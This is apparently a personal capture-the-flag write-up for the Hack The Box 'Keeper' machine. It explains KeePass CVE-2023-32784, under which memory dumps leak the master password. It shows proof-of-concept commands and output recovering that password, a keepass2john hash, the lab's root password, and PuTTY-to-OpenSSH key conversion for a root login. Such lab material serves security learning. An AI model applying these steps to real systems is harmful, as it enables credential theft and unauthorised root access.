# HTB - Keeper machine

New user. Initial password set to Welcome2023!\
\----------------------------------------------------\
KeePass CVE-2023-32784: Detection of Processes Memory Dump

\- - -- - - - - - - -- - - - - -- - - - - -- - - - - -- - -

allows the recovery of the cleartext master password from a memory dump. The memory dump can be a KeePass process dump, swap file (pagefile.sys), hibernation file (hiberfil.sys), or RAM dump of the entire system.

KeePass 2.X uses a custom-developed text box for password entry, SecureTextBoxEx. The flaw exploited in this CVE is that for every character typed, a leftover string is created in memory. Because of how .NET works, it is nearly impossible to get rid of it once it gets created. For example, when â€œPasswordâ€ is typed, it will result in these leftover strings: â€¢a, â€¢â€¢s, â€¢â€¢â€¢s, â€¢â€¢â€¢â€¢w, â€¢â€¢â€¢â€¢â€¢o, â€¢â€¢â€¢â€¢â€¢â€¢r, â€¢â€¢â€¢â€¢â€¢â€¢â€¢d. The first character cannot be recovered.\


\------------------------------------------------------

**kpcli --> keepass cli**

\==========================

`python3 poc.py -d KeePassdump.dmp`

\
2023-10-07 16:04:09,530 \[.] \[main] Opened KeePassdump.dmp\
Possible password: â—â—dgrâ—d med flâ—de\


\--------------------------------------------------\
**keepass2john == ?**

`keepass2john -k KeePassdump.dmp passcodes.kdbx`

\
passcodes:$keepass$\*2\*60000\*0\*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d\*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7\*08500fa5a52622ab89b0addfedd5a05c\*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125\*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc\*1\*64\*c998c35aa687b10cbeeaa70fb58a4f5728080bf6f1473efb848aeab39bce4eef

\==========================================

`python3 keepass_dump.py -f KeePassdump.dmp`

\
\[\*] Searching for masterkey characters\
\[-] Couldn't find jump points in file. Scanning with slower method.\
\[\*] 0:        {UNKNOWN}\
\[\*] 2:        d\
\[\*] 3:        g\
\[\*] 4:        r\
\[\*] 6:        d\
\[\*] 7:        \
\[\*] 8:        m\
\[\*] 9:        e\
\[\*] 10:        d\
\[\*] 11:        \
\[\*] 12:        f\
\[\*] 13:        l\
\[\*] 15:        d\
\[\*] 16:        e\
\[\*] Extracted: {UNKNOWN}dgrd med flde

\--------------------------------

Passwd: â—â—dgrâ—d med flâ—de\


rÃ¸dgrÃ¸d med flÃ¸de

\----------passwd from the dump -----

Welcome2023!\
F4><3K0nd!\
12345

\-----------

[username: root\
passwd: F4><3K0nd!](#user-content-fn-1)[^1]

\=========================

To convert putty user key file to ssh private key

`puttygen server.ppk -O private-openssh -o id_rsa`

\--------------------------------------------

`ssh -i id_rsa root@machineip`

boom !!

[^1]: 
